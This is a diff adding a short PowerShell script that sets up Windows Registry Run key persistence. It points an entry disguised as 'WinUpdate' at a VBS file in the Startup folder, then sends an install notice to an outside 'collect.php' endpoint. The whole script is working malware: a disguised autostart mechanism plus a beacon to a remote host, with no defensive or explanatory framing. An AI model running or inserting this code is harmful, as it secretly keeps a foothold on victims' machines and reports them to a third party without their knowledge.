@@ -1,0 +1,7 @@
+# Registry Run key persistence
+# Notifies your endpoint on install
+
+$payload = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUpdate" -Value $payload -Force
+$uri = "https://personfu.github.io/CyberWorld_login/collect.php"
+Invoke-WebRequest -Uri $uri -Method POST -Body @{event="run_key_installed"; payload=$payload} -UseBasicParsing
